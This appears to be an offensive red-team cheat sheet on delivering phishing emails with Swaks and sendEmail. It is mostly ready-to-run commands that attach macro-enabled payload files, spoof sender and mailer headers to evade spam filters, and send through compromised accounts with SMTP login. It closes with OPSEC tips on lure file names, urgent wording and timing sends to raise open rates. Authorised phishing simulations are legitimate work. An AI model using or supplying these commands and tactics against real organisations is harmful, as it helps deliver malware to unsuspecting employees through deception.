# Swaks — SMTP Payload Delivery

Swaks (Swiss Army Knife SMTP) is the standard tool for sending phishing emails with attachments directly from Kali.

---

## Basic Payload Delivery

```bash
# Send a plain email:
swaks --to victim@corp.com --from it@corp.com --server mail.corp.com --body "Please see the attached."

# Attach a file (docm, ics, iso, exe):
swaks --to victim@corp.com \
      --from it@corp.com \
      --server mail.corp.com \
      --header "Subject: Action Required" \
      --body "Please review the attached document." \
      --attach payload.docm

# Send to multiple targets:
swaks --to "user1@corp.com,user2@corp.com" \
      --from it@corp.com \
      --server mail.corp.com \
      --attach payload.docm
```

---

## Header Spoofing (Bypass Spam Filters)

```bash
# Spoof display name and add Reply-To (looks legitimate):
swaks --to victim@corp.com \
      --from "IT Department <it@corp.com>" \
      --header "Reply-To: it-real@yourdomain.com" \
      --header "X-Mailer: Microsoft Outlook 16.0" \
      --header "X-Originating-IP: 10.10.10.1" \
      --server mail.corp.com \
      --body "Please complete the attached form by end of day." \
      --attach form.docm

# Full spoofing with EHLO hostname masquerade:
swaks --to victim@corp.com \
      --from "noreply@corp.com" \
      --ehlo mail.corp.com \
      --header "Subject: Payroll Update - Action Required" \
      --server mail.corp.com \
      --attach payroll.xlsm
```

---

## SMTP Authentication (When Relay Requires Login)

```bash
# AUTH LOGIN:
swaks --to victim@corp.com \
      --from compromised@corp.com \
      --server mail.corp.com \
      --port 587 \
      --auth LOGIN \
      --auth-user "compromised@corp.com" \
      --auth-password "Password123" \
      --header "Subject: HR Update" \
      --body "Please review the document." \
      --attach payload.docm

# AUTH PLAIN:
swaks --to victim@corp.com \
      --from user@corp.com \
      --server mail.corp.com \
      --auth PLAIN \
      --auth-user "user" \
      --auth-password "Password123" \
      --attach payload.docm

# STARTTLS (encrypted connection):
swaks --to victim@corp.com \
      --from it@corp.com \
      --server mail.corp.com \
      --port 587 \
      --tls \
      --auth LOGIN \
      --auth-user "user@corp.com" \
      --auth-password "Password123" \
      --attach payload.docm
```

---

## Calendar Invite Delivery (.ics)

```bash
# Deliver .ics file (see 02-phishing/calendar/ for templates):
swaks --to victim@corp.com \
      --from "meetings@corp.com" \
      --header "Subject: Meeting Invitation: Q1 Review" \
      --header "Content-Type: text/calendar; charset=UTF-8; method=REQUEST" \
      --attach-type "text/calendar" \
      --attach calendar_invite.ics \
      --server mail.corp.com
```

---

## Test Without Sending (Dry Run)

```bash
# Connect and simulate but don't actually deliver:
swaks --to victim@corp.com --from it@corp.com --server mail.corp.com --quit-after RCPT

# Just test SMTP banner:
swaks --to victim@corp.com --server mail.corp.com --quit-after BANNER
```

---

## Common SMTP Ports

| Port | Use |
|------|-----|
| 25 | Standard SMTP (server-to-server, often blocked outbound) |
| 465 | SMTPS (SSL) |
| 587 | Submission (STARTTLS, requires auth) |
| 2525 | Alternative (sometimes used if 25/587 blocked) |

---

## sendEmail (Alternative to Swaks)

```bash
# Basic usage:
sendEmail -t victim@corp.com \
          -f it@corp.com \
          -s mail.corp.com:25 \
          -u "Action Required: Document Review" \
          -m "Please review the attached." \
          -a payload.docm

# With auth:
sendEmail -t victim@corp.com \
          -f user@corp.com \
          -s mail.corp.com:587 \
          -xu user@corp.com \
          -xp "Password123" \
          -u "HR Update" \
          -m "See attached." \
          -a payload.docm \
          -o tls=yes
```

---

## OPSEC Notes

- **Test first**: Always do `--quit-after RCPT` to verify the relay accepts your email before sending with payload
- **From address**: Use a compromised domain email if possible — improves deliverability
- **Attachment naming**: Professional names increase click rate: `Invoice_Q1_2026.docm`, `HR_Policy_Update.xlsm`, `IT_Security_Alert.docm`
- **Body**: Keep it short, professional, and urgent. Never use "Click here" literally.
- **Time sent**: Business hours (9-11am in target timezone) maximizes opens
